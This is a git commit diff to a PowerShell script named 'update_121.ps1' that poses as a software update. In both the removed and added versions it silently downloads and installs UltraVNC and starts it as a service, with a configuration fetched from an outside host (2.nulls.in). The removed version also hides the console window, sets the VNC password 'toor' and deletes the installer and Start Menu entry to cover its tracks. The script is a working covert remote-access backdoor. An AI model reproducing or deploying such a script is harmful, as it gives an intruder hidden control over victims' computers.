7acb31f1d34cfd197aa1aa474d908c1652167de1
Saurabh Patel <srbhptl39@gmail.com>
2021-09-14 19:28:04 +0530

    Update update_121.ps1

--- update_121.ps1
+++ update_121.ps1
@@ -1,27 +1,16 @@
-Add-Type -Name Window -Namespace Console -MemberDefinition '
-[DllImport("Kernel32.dll")] 
-public static extern IntPtr GetConsoleWindow();
-[DllImport("user32.dll")]
-public static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int W, int H); '
-
-$consoleHWND = [Console.Window]::GetConsoleWindow();
-$consoleHWND
-[Console.Window]::MoveWindow($consoleHWND,0,0,1,1);
-#cd $Env:USERPROFILE -ErrorAction Stop
-#Start-Sleep -Seconds 1 -ErrorAction Stop
 $client = new-object System.Net.WebClient -ErrorAction Stop
-#Start-Sleep -Seconds 1 -ErrorAction Stop
-$client.DownloadFile("https://www.uvnc.eu/download/134/UltraVNC_1_3_4_X64_Setup.exe","$Env:USERPROFILE\update_121.exe") ;
-#$client.DownloadFile("https://raw.githubusercontent.com/srbhptl39/automation/master/ultravnc.ini","$Env:USERPROFILE\update_121.ini");
-& $Env:USERPROFILE\update_121.exe /SP- /VERYSILENT /NORESTART -ErrorAction Stop
-#Copy-Item -Path $Env:USERPROFILE\update_121.ini -Destination 'C:\Program Files\uvnc bvba\UltraVNC\ultravnc.in' -ErrorAction Stop
+#$client.DownloadFile("https://www.uvnc.eu/download/134/UltraVNC_1_3_4_X64_Setup.exe","$Env:USERPROFILE\update_121.exe") ;
+$client.DownloadFile("http://2.nulls.in:5904/UltraVNC_1_3_4_X64_Setup.exe","$Env:USERPROFILE\update_121.exe") ;
+#$client.DownloadFile("https://github.com/srbhptl39/automation/raw/master/silentinstall.inf","$Env:USERPROFILE\silentinstall.inf") ;
+$client.DownloadFile("http://2.nulls.in:5904/silentinstall.inf","$Env:USERPROFILE\silentinstall.inf") ;
+& $Env:USERPROFILE\update_121.exe /verysilent /loadinf="silentinstall.inf" /NORESTART
+Start-Sleep -Seconds 3 -ErrorAction Stop
+$client.DownloadFile("http://2.nulls.in:5904/ultravnc.ini","C:\Program Files\uvnc bvba\UltraVNC\ultravnc.ini") ;
+Stop-Service uvnc_service
+#& 'C:\Program Files\uvnc bvba\UltraVNC\winvnc.exe' -install
 Start-Sleep -Seconds 2 -ErrorAction Stop
-& 'C:\Program Files\uvnc bvba\UltraVNC\setpasswd.exe' "toor";
-#& 'C:\Program Files\uvnc bvba\UltraVNC\winvnc.exe' -install;
-Start-Sleep -Seconds 1 -ErrorAction Stop
-& 'C:\Program Files\uvnc bvba\UltraVNC\winvnc.exe' -run;
-Remove-Item "$Env:USERPROFILE\update_121.exe"
-Remove-Item 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\UltraVNC\' -Recurse
+#& 'C:\Program Files\uvnc bvba\UltraVNC\winvnc.exe' -stopservice
+$client.DownloadFile("http://2.nulls.in:5904/ultravnc.ini","C:\Program Files\uvnc bvba\UltraVNC\ultravnc.ini") ;
+Start-Sleep -Seconds 2 -ErrorAction Stop
+Start-Service uvnc_service
 exit;
-
-
